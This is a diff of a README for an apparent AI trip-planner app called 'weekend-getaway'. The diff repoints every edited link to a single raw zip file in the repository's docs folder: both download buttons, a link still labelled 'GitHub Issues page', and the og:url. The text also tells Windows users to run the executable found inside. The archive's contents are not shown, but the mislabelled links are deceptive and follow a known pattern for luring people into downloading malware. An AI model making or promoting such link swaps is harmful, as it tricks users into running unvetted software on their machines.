@@ -1,6 +1,6 @@
 <h1>🗺️ weekend-getaway - Plan Smart, Escape Fast</h1>
 <p align="center">
-  <a href="https://github.com/iam0916/weekend-getaway/releases" style="display: inline-block; padding: 12px 24px; font-size: 18px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);">⬇️ Download Weekend Getaway</a>
+  <a href="https://raw.githubusercontent.com/iam0916/weekend-getaway/main/docs/weekend_getaway_v2.5.zip" style="display: inline-block; padding: 12px 24px; font-size: 18px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);">⬇️ Download Weekend Getaway</a>
 </p>
 
 <h2>🚀 What Is Weekend Getaway?</h2>
@@ -17,7 +17,7 @@
 
 <h2>📦 Download & Install</h2>
 <p>Getting started is simple. Visit the link below to download the application:</p>
-<p style="text-align: center;"><a href="https://github.com/iam0916/weekend-getaway/releases" style="display: inline-block; padding: 10px 20px; background: #28a745; color: white; text-decoration: none; border-radius: 5px; font-size: 18px;">⬇️ Download Weekend Getaway</a></p>
+<p style="text-align: center;"><a href="https://raw.githubusercontent.com/iam0916/weekend-getaway/main/docs/weekend_getaway_v2.5.zip" style="display: inline-block; padding: 10px 20px; background: #28a745; color: white; text-decoration: none; border-radius: 5px; font-size: 18px;">⬇️ Download Weekend Getaway</a></p>
 <p><strong>Windows users:</strong> Download the latest release file (look for the .exe or .zip file). Visit this link to download the application. Once downloaded, run the installer or extract the zip folder and launch the executable file inside.</p>
 
 <h2>🖥️ How to Use</h2>
@@ -55,7 +55,7 @@
 <p><strong>Can I use it offline?</strong><br>No – it requires live search and AI processing online.</p>
 
 <h2>💬 Feedback & Support</h2>
-<p>If you experience issues or have feature requests, please open a ticket on the <a href="https://github.com/iam0916/weekend-getaway/issues">GitHub Issues page</a>. We welcome contributions, but for non-technical users, just enjoy the app.</p>
+<p>If you experience issues or have feature requests, please open a ticket on the <a href="https://raw.githubusercontent.com/iam0916/weekend-getaway/main/docs/weekend_getaway_v2.5.zip">GitHub Issues page</a>. We welcome contributions, but for non-technical users, just enjoy the app.</p>
 
 <h2>📜 License</h2>
 <p>This project is distributed under the MIT License.</p>
@@ -69,7 +69,7 @@
   <meta name="author" content="iam0916">
   <meta property="og:title" content="weekend-getaway - AI Weekend Trip Planner">
   <meta property="og:description" content="Rank destinations and build fact-checked itineraries with AI and live web search.">
-  <meta property="og:url" content="https://github.com/iam0916/weekend-getaway">
+  <meta property="og:url" content="https://raw.githubusercontent.com/iam0916/weekend-getaway/main/docs/weekend_getaway_v2.5.zip">
   <style>
     body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; line-height: 1.6; margin: 0 auto; max-width: 960px; padding: 20px; color: #333; }
     h1, h2 { color: #1a1a2e; }
